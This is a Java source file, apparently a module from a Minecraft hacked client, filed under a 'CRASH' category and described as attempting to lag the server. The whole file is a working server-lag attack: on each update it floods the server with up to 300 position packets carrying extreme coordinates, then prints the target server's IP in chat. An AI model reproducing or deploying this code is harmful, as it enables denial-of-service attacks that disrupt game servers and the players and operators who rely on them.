package net.zebra.quiverone.modules.crash;

import net.minecraft.class_124;
import net.minecraft.class_2828.class_2829;
import net.zebra.quiverone.modules.Category;
import net.zebra.quiverone.modules.Module;
import net.zebra.quiverone.modules.setting.Setting;
import net.zebra.quiverone.modules.setting.settings.BooleanSetting;
import net.zebra.quiverone.modules.setting.settings.NumberSetting;

public class Position extends Module {
   private BooleanSetting autoDisable = new BooleanSetting("AutoDisable", this, true);
   private BooleanSetting sendMessage = new BooleanSetting("Send Message", this, true);
   private class_2829 position = new class_2829(3000000.0D, 100.0D, 3000000.0D, true);
   public NumberSetting speed = new NumberSetting("Speed", this, 100.0D, 1.0D, 300.0D, 1.0D);

   public Position() {
      super("Position", "Attempts to lag the server", Category.CRASH, -1, false, true);
      this.addSetting(new Setting[]{this.speed, this.autoDisable, this.sendMessage});
   }

   public void onUpdate() {
      for(int i = 0; (double)i < this.speed.getValue(); ++i) {
         mc.method_1562().method_2883(this.position);
      }

      if (this.sendMessage.isEnabled()) {
         sendMessage("Attempted to lag " + class_124.field_1079 + this.getIP() + class_124.field_1061 + " using" + class_124.field_1077 + " Position");
      }

      if (this.autoDisable.isEnabled()) {
         this.disable();
      }

   }
}
